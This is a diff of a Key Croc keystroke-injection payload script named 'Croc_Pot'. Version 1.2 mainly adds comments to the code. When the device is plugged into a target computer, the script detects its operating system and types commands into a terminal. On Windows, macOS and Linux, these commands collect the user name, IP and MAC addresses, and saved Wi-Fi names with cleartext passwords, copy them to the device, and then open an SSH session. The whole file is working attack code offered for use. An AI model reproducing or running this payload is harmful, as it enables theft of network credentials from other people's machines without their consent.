@@ -1,238 +1,322 @@
 # Title:         Croc_Pot Payload
 # Description:   Start Croc_pot.sh bash script automatically, scan takes about 30-40 sec to start because of OS detection
-#                This will collect some data like (ip address, current user name, pc host name, ssid and passwd, mac address)
+#                This will collect some data off target PC
+#                (ip address, current user name, pc host name, ssid and passwd, mac address)
 #                save to tools/Croc_pot folder
 # Author:        Spywill
-# Version:       1.1
+# Version:       1.2
 # Category:      Key Croc
-#
-#
+
 MATCH crocpot
-#
-CROC_PW=hak5croc      #<-----Edit KEYCROC_PASSWD_HERE
-PC_PW=LINUX           #<-----Edit LINUX-PC_PASSWD_HERE
+
+#---> Edit KEYCROC_PASSWD_HERE
+CROC_PW=hak5croc
+
+#---> Edit LINUX-PC_PASSWD_HERE
+PC_PW=LINUX
+
+#---> Save keycroc passwd in temp folder
+#---> This is used for starting Reverse SSH Tunnel with Target PC
 echo "${CROC_PW}" >> /tmp/CPW.txt
-#
+
+#---> Payload variable/remove existing OS detection
 CROC_OS=/root/udisk/tools/Croc_Pot/Croc_OS.txt
 cat > ${CROC_OS}
 rm /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/tools/Croc_Pot/shark_ip.txt
+
+#---> Enter ethernet mode for OS detection
 ATTACKMODE AUTO_ETHERNET
 LED ATTACK
+
+#---> Keycroc built in functions to retrieve target PC Loot
 GET TARGET_OS
 GET TARGET_IP
 GET HOST_IP
 GET TARGET_HOSTNAME
+
+#---> After OS detection case TARGET_OS value
 case $TARGET_OS in
-    WINDOWS)
-           LED R
-           ATTACKMODE HID STORAGE
-           sleep 1
-           Q GUI r
-           sleep 1
-           Q STRING "powershell"
-           Q ENTER
-           sleep 5
-           Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
-           Q ENTER
-           sleep 1
-           Q STRING "\$env:UserName | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\Croc_OS_Target.txt\" -noclobber -append"
-           Q ENTER
-           sleep 1
-           Q STRING "Get-CimInstance -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=\$true | Select-Object -ExpandProperty IPAddress | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\Croc_OS_Target.txt\" -noclobber -append"
-           Q ENTER
-           sleep 1
-           Q STRING "(netsh wlan show networks) | Select-String \"\:(.+)\$\" | % {\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | Select-String \"Key Content\W+\:(.+)\$\" | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\Croc_OS_Target.txt\" -noclobber -append"
-           Q ENTER
-           sleep 2
-           Q STRING "wmic nic where PhysicalAdapter=True get MACAddress,Name | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\Croc_OS_Target.txt\" -noclobber -append"
-           Q ENTER
-           sleep 3
-           Q STRING "[System.Net.Dns]::GetHostAddresses(\"shark.lan\")[0].IPAddressToString | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\shark_ip.txt\" -noclobber -append"
-           Q ENTER
-           sleep 3           
-           ATTACKMODE HID
-           sleep 1
-           Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
-           Q ENTER
-           sleep 2
-           Q STRING "${CROC_PW}"
-           Q ENTER
-           sleep 2
-           echo "$TARGET_OS" >> ${CROC_OS}
-           echo "$TARGET_IP" >> ${CROC_OS}
-           echo "$TARGET_HOSTNAME" >> ${CROC_OS}
-           echo "$HOST_IP" >> ${CROC_OS}
-           $(sed -i 's/\r//g' /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/tools/Croc_Pot/shark_ip.txt)
-           $(sed -i '0,/./s/^.//' /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/tools/Croc_Pot/shark_ip.txt)
-           Q STRING "/root/udisk/tools/Croc_Pot.sh"
-           Q ENTER;;
-      MACOS)
-           ATTACKMODE HID
-           LED G
-           sleep 1
-           Q GUI-SPACE
-           sleep 1
-           Q STRING "terminal"
-           Q ENTER
-           sleep 2
-           Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
-           Q ENTER
-           sleep 2
-           Q STRING "${CROC_PW}"
-           Q ENTER
-           sleep 1
-           echo "$TARGET_OS" >> ${CROC_OS}
-           echo "$TARGET_IP" >> ${CROC_OS}
-           echo "$TARGET_HOSTNAME" >> ${CROC_OS}
-           echo "$HOST_IP" >> ${CROC_OS}
-           Q STRING "/root/udisk/tools/Croc_Pot.sh"
-           Q ENTER;;
-      LINUX)
-           ATTACKMODE HID STORAGE
-           LED B
-           sleep 3
-           case $TARGET_HOSTNAME in
-raspberrypi) 
-           Q GUI d
-           sleep 1
-           Q STRING "terminal"
-           Q ENTER
-           Q ENTER
-           sleep 2
-           Q STRING "PC_USER=/media/\$(whoami)/KeyCroc/tools/Croc_Pot/Croc_OS_Target.txt"
-           Q ENTER
-           Q STRING "whoami | tee \${PC_USER}"
-           Q ENTER
-           sleep 1
-           Q STRING "ip -4 -o addr show wlan0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && ip -4 -o addr show eth0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && ip -4 -o addr show eth1 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && echo '' >> \${PC_USER}" 
-           Q ENTER
-           sleep 1
-           Q STRING "sed -n '/ssid\|psk/,+1p' /etc/wpa_supplicant/wpa_supplicant.conf | sed -e 's/[\"]//g' | tee -a \${PC_USER}"
-           Q ENTER
-           sleep 1
-           Q STRING "ip -o link | awk '\$2 != \"lo:\" {print \$2, \$(NF-2)}' | tee -a \${PC_USER}"
-           Q ENTER
-           sleep 2
-           Q STRING "ping -c1 -w3 shark.lan | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/shark_ip.txt"
-           Q ENTER
-           sleep 2
-           ATTACKMODE HID
-           sleep 1
-           Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
-           Q ENTER
-           sleep 2
-           Q STRING "${CROC_PW}"
-           Q ENTER
-           echo "$TARGET_OS" | tee -a ${CROC_OS}
-           echo "$TARGET_IP" | tee -a ${CROC_OS}
-           echo "$TARGET_HOSTNAME" | tee -a ${CROC_OS}
-           echo "$HOST_IP" | tee -a ${CROC_OS}
-           Q STRING "/root/udisk/tools/Croc_Pot.sh"
-           Q ENTER;;
-     parrot)
-           Q ALT F2
-           sleep 1
-           Q STRING "mate-terminal"
-           Q ENTER
-           sleep 1
-           Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/"
-           Q ENTER
-           Q STRING "${PC_PW}"
-           Q ENTER
-           sleep 1
-           Q STRING "sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0"
-           Q ENTER
-           sleep 1
-           Q STRING "sudo chmod 777 /media/\$(whoami)/KeyCroc/"
-           Q ENTER
-           sleep 1
-           Q STRING "PC_USER=/media/\$(whoami)/KeyCroc/tools/Croc_Pot/Croc_OS_Target.txt"
-           Q ENTER
-           Q STRING "whoami | tee \${PC_USER}"
-           Q ENTER
-           sleep 1
-           Q STRING "ip -4 -o addr show wlan0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && ip -4 -o addr show eth0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && ip -4 -o addr show eth1 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && echo '' >> \${PC_USER}"  
-           Q ENTER
-           sleep 1
-           Q STRING "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | sed -E -e 's/[/]//g' -e 's/etc//g' -e 's/NetworkManagersystem-connections//g' -e 's/.nmconnection:psk//g' | tee -a \${PC_USER}"
-           Q ENTER
-           sleep 1
-           Q STRING "ip -o link | awk '\$2 != \"lo:\" {print \$2, \$(NF-2)}' | tee -a \${PC_USER}"
-           Q ENTER
-           sleep 1
-           Q STRING "ping -c1 -w3 shark.lan | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/shark_ip.txt"
-           Q ENTER
-           sleep 2
-           Q STRING "sudo umount /media/\$(whoami)/KeyCroc/"
-           Q ENTER
-           sleep 1
-           ATTACKMODE HID
-           Q STRING "sudo rmdir /media/\$(whoami)/KeyCroc/"
-           Q ENTER
-           sleep 2
-           Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
-           Q ENTER
-           sleep 1
-           Q STRING "${CROC_PW}"
-           Q ENTER
-           echo "$TARGET_OS" | tee -a ${CROC_OS}
-           echo "$TARGET_IP" | tee -a ${CROC_OS}
-           echo "$TARGET_HOSTNAME" | tee -a ${CROC_OS}
-           echo "$HOST_IP" | tee -a ${CROC_OS}
-           Q STRING "/root/udisk/tools/Croc_Pot.sh"
-           Q ENTER;;
-          *)
-           Q ALT F2
-           sleep 1
-           Q STRING "xterm"
-           Q ENTER
-           sleep 1
-           Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/"
-           Q ENTER
-           Q STRING "${PC_PW}"
-           Q ENTER
-           sleep 1
-           Q STRING "sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0"
-           Q ENTER
-           sleep 1
-           Q STRING "sudo chmod 777 /media/\$(whoami)/KeyCroc/"
-           Q ENTER
-           sleep 1
-           Q STRING "PC_USER=/media/\$(whoami)/KeyCroc/tools/Croc_Pot/Croc_OS_Target.txt"
-           Q ENTER
-           Q STRING "whoami | tee \${PC_USER}"
-           Q ENTER
-           sleep 1
-           Q STRING "ip -4 -o addr show wlan0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && ip -4 -o addr show eth0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && ip -4 -o addr show eth1 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && echo '' >> \${PC_USER}"  
-           Q ENTER
-           sleep 1
-           Q STRING "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | sed -E -e 's/[/]//g' -e 's/etc//g' -e 's/NetworkManagersystem-connections//g' -e 's/.nmconnection:psk//g' | tee -a \${PC_USER}"
-           Q ENTER
-           sleep 1
-           Q STRING "ip -o link | awk '\$2 != \"lo:\" {print \$2, \$(NF-2)}' | tee -a \${PC_USER}"
-           Q ENTER
-           sleep 1
-           Q STRING "ping -c1 -w3 shark.lan | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/shark_ip.txt"
-           Q ENTER
-           sleep 2
-           Q STRING "sudo umount /media/\$(whoami)/KeyCroc/"
-           Q ENTER
-           sleep 1
-           ATTACKMODE HID
-           Q STRING "sudo rmdir /media/\$(whoami)/KeyCroc/"
-           Q ENTER
-           sleep 2
-           Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
-           Q ENTER
-           sleep 1
-           Q STRING "${CROC_PW}"
-           Q ENTER
-           echo "$TARGET_OS" | tee -a ${CROC_OS}
-           echo "$TARGET_IP" | tee -a ${CROC_OS}
-           echo "$TARGET_HOSTNAME" | tee -a ${CROC_OS}
-           echo "$HOST_IP" | tee -a ${CROC_OS}
-           Q STRING "/root/udisk/tools/Croc_Pot.sh"
-           Q ENTER;;
-      esac
-    ;;
+WINDOWS)
+	LED R
+	#---> Enter Storage mode on keycroc
+	ATTACKMODE HID STORAGE
+	sleep 1
+	#---> Start windows powershell
+	Q GUI r
+	sleep 1
+	Q STRING "powershell"
+	Q ENTER
+	sleep 5
+	#---> Place keycroc usb drive into variable
+	Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
+	Q ENTER
+	sleep 1
+	#---> Retrieve target PC user name & save to tools/Croc_Pot/Croc_OS_Target.txt
+	Q STRING "\$env:UserName | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\Croc_OS_Target.txt\" -noclobber -append"
+	Q ENTER
+	sleep 1
+	#---> Retrieve target PC IP address & save to tools/Croc_Pot/Croc_OS_Target.txt
+	Q STRING "Get-CimInstance -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=\$true | Select-Object -ExpandProperty IPAddress | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\Croc_OS_Target.txt\" -noclobber -append"
+	Q ENTER
+	sleep 1
+	#---> Retrieve target PC SSID/PASSWD & save to tools/Croc_Pot/Croc_OS_Target.txt
+	Q STRING "(netsh wlan show networks) | Select-String \"\:(.+)\$\" | % {\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | Select-String \"Key Content\W+\:(.+)\$\" | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\Croc_OS_Target.txt\" -noclobber -append"
+	Q ENTER
+	sleep 2
+	#---> Retrieve target PC MAC address & save to tools/Croc_Pot/Croc_OS_Target.txt
+	Q STRING "wmic nic where PhysicalAdapter=True get MACAddress,Name | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\Croc_OS_Target.txt\" -noclobber -append"
+	Q ENTER
+	sleep 3
+	#---> Retrieve Shark Jack IP if connected to local network as keycroc & save to tools/Croc_Pot/shark_ip.txt
+	Q STRING "[System.Net.Dns]::GetHostAddresses(\"shark.lan\")[0].IPAddressToString | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\shark_ip.txt\" -noclobber -append"
+	Q ENTER
+	sleep 3
+	#---> Return back to ATTACKMODE HID mode
+	ATTACKMODE HID
+	sleep 1
+	#---> Start SSH session with target PC
+	Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
+	Q ENTER
+	sleep 2
+	#---> Entering keycroc passwd
+	Q STRING "${CROC_PW}"
+	Q ENTER
+	sleep 2
+	#---> Save Keycroc built in functions to tools/Croc_Pot/Croc_OS.txt
+	echo "$TARGET_OS" >> ${CROC_OS}
+	echo "$TARGET_IP" >> ${CROC_OS}
+	echo "$TARGET_HOSTNAME" >> ${CROC_OS}
+	echo "$HOST_IP" >> ${CROC_OS}
+	#---> Edit with sed to remove powershell output "r" endlines & remove first character
+	$(sed -i 's/\r//g' /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/tools/Croc_Pot/shark_ip.txt)
+	$(sed -i '0,/./s/^.//' /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/tools/Croc_Pot/shark_ip.txt)
+	#---> Starting Croc_Pot
+	Q STRING "/root/udisk/tools/Croc_Pot.sh"
+	Q ENTER ;;
+MACOS)
+	#---> Return back to ATTACKMODE HID mode
+	ATTACKMODE HID
+	LED G
+	sleep 1
+	#---> Start mac os terminal
+	Q GUI-SPACE
+	sleep 1
+	Q STRING "terminal"
+	Q ENTER
+	sleep 2
+	#---> Start SSH session with target PC
+	Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
+	Q ENTER
+	sleep 2
+	#---> Entering keycroc passwd
+	Q STRING "${CROC_PW}"
+	Q ENTER
+	sleep 1
+	#---> Save Keycroc built in functions to tools/Croc_Pot/Croc_OS.txt
+	echo "$TARGET_OS" >> ${CROC_OS}
+	echo "$TARGET_IP" >> ${CROC_OS}
+	echo "$TARGET_HOSTNAME" >> ${CROC_OS}
+	echo "$HOST_IP" >> ${CROC_OS}
+	#---> Starting Croc_Pot
+	Q STRING "/root/udisk/tools/Croc_Pot.sh"
+	Q ENTER ;;
+LINUX)
+	#---> Enter Storage mode on keycroc
+	ATTACKMODE HID STORAGE
+	LED B
+	sleep 3
+	#---> After TARGET_HOSTNAME scan case TARGET_HOSTNAME value
+	case $TARGET_HOSTNAME in
+raspberrypi)
+	#---> Start Raspberry pi 4 terminal -->gnome-terminal installed<--
+	Q GUI d
+	sleep 1
+	Q STRING "terminal"
+	Q ENTER
+	Q ENTER
+	sleep 2
+	#---> Place keycroc usb drive into variable
+	Q STRING "PC_USER=/media/\$(whoami)/KeyCroc/tools/Croc_Pot/Croc_OS_Target.txt"
+	Q ENTER
+	#---> Retrieve target PC user name & save to tools/Croc_Pot/Croc_OS_Target.txt
+	Q STRING "whoami | tee \${PC_USER}"
+	Q ENTER
+	sleep 1
+	#---> Retrieve target PC IP address & save to tools/Croc_Pot/Croc_OS_Target.txt
+	Q STRING "ip -4 -o addr show wlan0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && ip -4 -o addr show eth0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && ip -4 -o addr show eth1 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && echo '' >> \${PC_USER}"
+	Q ENTER
+	sleep 1
+	#---> Retrieve target PC SSID/PASSWD & save to tools/Croc_Pot/Croc_OS_Target.txt
+	Q STRING "sed -n '/ssid\|psk/,+1p' /etc/wpa_supplicant/wpa_supplicant.conf | sed -e 's/[\"]//g' | tee -a \${PC_USER}"
+	Q ENTER
+	sleep 1
+	#---> Retrieve target PC MAC address & save to tools/Croc_Pot/Croc_OS_Target.txt
+	Q STRING "ip -o link | awk '\$2 != \"lo:\" {print \$2, \$(NF-2)}' | tee -a \${PC_USER}"
+	Q ENTER
+	sleep 2
+	#---> Retrieve Shark Jack IP if connected to local network as keycroc & save to tools/Croc_Pot/shark_ip.txt
+	Q STRING "ping -c1 -w3 shark.lan | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/shark_ip.txt"
+	Q ENTER
+	sleep 2
+	#---> Return back to ATTACKMODE HID mode
+	ATTACKMODE HID
+	sleep 1
+	#---> Start SSH session with target PC
+	Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
+	Q ENTER
+	sleep 2
+	#---> Entering keycroc passwd
+	Q STRING "${CROC_PW}"
+	Q ENTER
+	#---> Save Keycroc built in functions to tools/Croc_Pot/Croc_OS.txt
+	echo "$TARGET_OS" | tee -a ${CROC_OS}
+	echo "$TARGET_IP" | tee -a ${CROC_OS}
+	echo "$TARGET_HOSTNAME" | tee -a ${CROC_OS}
+	echo "$HOST_IP" | tee -a ${CROC_OS}
+	#---> Starting Croc_Pot
+	Q STRING "/root/udisk/tools/Croc_Pot.sh"
+	Q ENTER ;;
+parrot)
+	#---> Start mate-terminal -->Parrot OS<--
+	Q ALT F2
+	sleep 1
+	Q STRING "mate-terminal"
+	Q ENTER
+	sleep 1
+	#---> Create keycroc directory
+	Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/"
+	Q ENTER
+	#---> Entering Linux passwd
+	Q STRING "${PC_PW}"
+	Q ENTER
+	sleep 1
+	#---> Mount keycroc usb drive to target pc
+	Q STRING "sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0"
+	Q ENTER
+	sleep 1
+	#---> Make KeyCroc folder executable
+	Q STRING "sudo chmod 777 /media/\$(whoami)/KeyCroc/"
+	Q ENTER
+	sleep 1
+	#---> Place keycroc usb drive into variable
+	Q STRING "PC_USER=/media/\$(whoami)/KeyCroc/tools/Croc_Pot/Croc_OS_Target.txt"
+	Q ENTER
+	#---> Retrieve target PC user name & save to tools/Croc_Pot/Croc_OS_Target.txt
+	Q STRING "whoami | tee \${PC_USER}"
+	Q ENTER
+	sleep 1
+	#---> Retrieve target PC IP address & save to tools/Croc_Pot/Croc_OS_Target.txt
+	Q STRING "ip -4 -o addr show wlan0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && ip -4 -o addr show eth0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && ip -4 -o addr show eth1 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && echo '' >> \${PC_USER}"
+	Q ENTER
+	sleep 1
+	#---> Retrieve target PC SSID/PASSWD & save to tools/Croc_Pot/Croc_OS_Target.txt
+	Q STRING "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | sed -E -e 's/[/]//g' -e 's/etc//g' -e 's/NetworkManagersystem-connections//g' -e 's/.nmconnection:psk//g' | tee -a \${PC_USER}"
+	Q ENTER
+	sleep 1
+	#---> Retrieve target PC MAC address & save to tools/Croc_Pot/Croc_OS_Target.txt
+	Q STRING "ip -o link | awk '\$2 != \"lo:\" {print \$2, \$(NF-2)}' | tee -a \${PC_USER}"
+	Q ENTER
+	sleep 1
+	#---> Retrieve Shark Jack IP if connected to local network as keycroc & save to tools/Croc_Pot/shark_ip.txt
+	Q STRING "ping -c1 -w3 shark.lan | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/shark_ip.txt"
+	Q ENTER
+	sleep 2
+	#---> Unmount keycroc usb drive
+	Q STRING "sudo umount /media/\$(whoami)/KeyCroc/"
+	Q ENTER
+	sleep 1
+	#---> Return back to ATTACKMODE HID mode
+	ATTACKMODE HID
+	#---> Remove keycroc directory off target pc
+	Q STRING "sudo rmdir /media/\$(whoami)/KeyCroc/"
+	Q ENTER
+	sleep 2
+	#---> Start SSH session with target PC
+	Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
+	Q ENTER
+	sleep 1
+	#---> Entering keycroc passwd
+	Q STRING "${CROC_PW}"
+	Q ENTER
+	#---> Save Keycroc built in functions to tools/Croc_Pot/Croc_OS.txt
+	echo "$TARGET_OS" | tee -a ${CROC_OS}
+	echo "$TARGET_IP" | tee -a ${CROC_OS}
+	echo "$TARGET_HOSTNAME" | tee -a ${CROC_OS}
+	echo "$HOST_IP" | tee -a ${CROC_OS}
+	#---> Starting Croc_Pot
+	Q STRING "/root/udisk/tools/Croc_Pot.sh"
+	Q ENTER ;;
+*)
+	#---> Start linux distributions terminal xterm 
+	#---> Unsure of which linux distribution this will work on
+	Q ALT F2
+	sleep 1
+	Q STRING "xterm"
+	Q ENTER
+	sleep 1
+	#---> Create keycroc directory
+	Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/"
+	Q ENTER
+	#---> Entering Linux passwd
+	Q STRING "${PC_PW}"
+	Q ENTER
+	sleep 1
+	#---> Mount keycroc usb drive to target pc
+	Q STRING "sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0"
+	Q ENTER
+	sleep 1
+	#---> Make KeyCroc folder executable
+	Q STRING "sudo chmod 777 /media/\$(whoami)/KeyCroc/"
+	Q ENTER
+	sleep 1
+	#---> Place keycroc usb drive into variable
+	Q STRING "PC_USER=/media/\$(whoami)/KeyCroc/tools/Croc_Pot/Croc_OS_Target.txt"
+	Q ENTER
+	#---> Retrieve target PC user name & save to tools/Croc_Pot/Croc_OS_Target.txt
+	Q STRING "whoami | tee \${PC_USER}"
+	Q ENTER
+	sleep 1
+	#---> Retrieve target PC IP address & save to tools/Croc_Pot/Croc_OS_Target.txt
+	Q STRING "ip -4 -o addr show wlan0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && ip -4 -o addr show eth0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && ip -4 -o addr show eth1 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && echo '' >> \${PC_USER}"
+	Q ENTER
+	sleep 1
+	#---> Retrieve target PC SSID/PASSWD & save to tools/Croc_Pot/Croc_OS_Target.txt
+	Q STRING "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | sed -E -e 's/[/]//g' -e 's/etc//g' -e 's/NetworkManagersystem-connections//g' -e 's/.nmconnection:psk//g' | tee -a \${PC_USER}"
+	Q ENTER
+	sleep 1
+	#---> Retrieve target PC MAC address & save to tools/Croc_Pot/Croc_OS_Target.txt
+	Q STRING "ip -o link | awk '\$2 != \"lo:\" {print \$2, \$(NF-2)}' | tee -a \${PC_USER}"
+	Q ENTER
+	sleep 1
+	#---> Retrieve Shark Jack IP if connected to local network as keycroc & save to tools/Croc_Pot/shark_ip.txt
+	Q STRING "ping -c1 -w3 shark.lan | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/shark_ip.txt"
+	Q ENTER
+	sleep 2
+	#---> Unmount keycroc usb drive
+	Q STRING "sudo umount /media/\$(whoami)/KeyCroc/"
+	Q ENTER
+	sleep 1
+	#---> Return back to ATTACKMODE HID mode
+	ATTACKMODE HID
+	#---> Remove keycroc directory off target pc
+	Q STRING "sudo rmdir /media/\$(whoami)/KeyCroc/"
+	Q ENTER
+	sleep 2
+	#---> Start SSH session with target PC
+	Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
+	Q ENTER
+	sleep 1
+	#---> Entering keycroc passwd
+	Q STRING "${CROC_PW}"
+	Q ENTER
+	#---> Save Keycroc built in functions to tools/Croc_Pot/Croc_OS.txt
+	echo "$TARGET_OS" | tee -a ${CROC_OS}
+	echo "$TARGET_IP" | tee -a ${CROC_OS}
+	echo "$TARGET_HOSTNAME" | tee -a ${CROC_OS}
+	echo "$HOST_IP" | tee -a ${CROC_OS}
+	#---> Starting Croc_Pot
+	Q STRING "/root/udisk/tools/Croc_Pot.sh"
+	Q ENTER ;;
+	esac
+	;;
 esac
